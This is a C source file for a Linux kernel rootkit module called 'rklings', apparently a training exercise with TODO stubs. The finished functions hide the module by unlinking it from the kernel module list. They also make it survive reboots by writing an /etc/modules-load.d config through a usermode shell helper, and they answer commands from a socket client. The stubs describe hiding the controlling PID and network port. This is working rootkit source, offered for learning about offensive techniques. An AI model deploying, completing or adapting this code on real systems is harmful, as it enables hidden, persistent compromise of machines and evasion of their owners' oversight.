// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"

/* TODO: Declare auto_pid_index and auto_port_index, both initialized to -1 */

/* Module hiding state */
struct list_head *saved_prev;
bool module_hidden;

/* Persistence state */
bool persist_active;

/*
 * TODO: Implement rk_auto_hide(struct socket *client).
 *
 * 1. Get the kthread PID: snprintf(pidstr, sizeof(pidstr), "%d", current->pid)
 * 2. Record pid_count as auto_pid_index.
 * 3. Add the PID string to hidden_pids with rk_target_add.
 * 4. Get the source port: ntohs(inet_sk(client->sk)->inet_sport)
 * 5. Record port_count as auto_port_index.
 * 6. Add the port to hidden_ports, increment port_count.
 */

/*
 * TODO: Implement rk_auto_unhide(void).
 *
 * Remove the auto-hidden entries in reverse order (port first, PID second)
 * so the index shift does not invalidate the other entry.
 *
 * 1. If auto_port_index is valid, call rk_port_remove_at(auto_port_index).
 *    If auto_pid_index was after it, decrement auto_pid_index.
 *    Reset auto_port_index to -1.
 * 2. If auto_pid_index is valid, call rk_target_remove_at on hidden_pids.
 *    Reset auto_pid_index to -1.
 */

int rk_cmd_hide_module(struct socket *client)
{
	if (module_hidden)
		return RK_REPLY(client, "already hidden\n");

	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	module_hidden = true;
	return RK_REPLY(client, "module hidden\n");
}

int rk_cmd_unhide_module(struct socket *client)
{
	if (!module_hidden)
		return RK_REPLY(client, "already visible\n");

	list_add(&THIS_MODULE->list, saved_prev);
	module_hidden = false;
	return RK_REPLY(client, "module visible\n");
}

int rk_cmd_persist(struct socket *client)
{
	char *argv[] = { "/bin/sh", "-c",
		"echo rklings > /etc/modules-load.d/rklings.conf", NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int error;

	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (error)
		return RK_REPLY(client, "persist failed\n");
	persist_active = true;
	return RK_REPLY(client, "persisted\n");
}

int rk_cmd_unpersist(struct socket *client)
{
	char *argv[] = { "/bin/sh", "-c",
		"rm -f /etc/modules-load.d/rklings.conf", NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int error;

	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (error)
		return RK_REPLY(client, "unpersist failed\n");
	persist_active = false;
	return RK_REPLY(client, "unpersisted\n");
}
